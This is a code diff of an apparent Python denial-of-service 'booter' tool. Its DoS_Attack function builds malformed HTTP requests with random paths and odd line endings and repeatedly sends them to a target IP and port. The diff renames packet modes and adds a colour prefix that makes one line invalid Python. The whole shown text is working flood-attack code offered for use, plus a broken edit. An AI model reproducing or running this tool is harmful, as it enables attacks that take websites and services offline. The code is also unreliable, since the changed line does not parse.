@@ -29,7 +29,7 @@ def generate_url_path_pyflooder(num):
     return data
     
 def generate_url_path_choice(num):
-    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
+    letter = {Fore.BLACK} '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
     data = ""
     for _ in range(int(num)):
         data += random.choice(letter)
@@ -49,15 +49,15 @@ def DoS_Attack(ip,host,port,type_attack,id,booter_sent,data_type_loader_packet):
     try:
         if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
             packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
-        elif data_type_loader_packet == 'OWN1':
+        elif data_type_loader_packet == 'Load1':
             packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
-        elif data_type_loader_packet == 'OWN2':
+        elif data_type_loader_packet == 'Load2':
             packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
-        elif data_type_loader_packet == 'OWN3':
+        elif data_type_loader_packet == 'Load3':
             packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
-        elif data_type_loader_packet == 'OWN4':
+        elif data_type_loader_packet == 'Load4':
             packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
-        elif data_type_loader_packet == 'OWN5':
+        elif data_type_loader_packet == 'Load5':
             packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
         s.connect((ip,port))
         for _ in range(booter_sent):
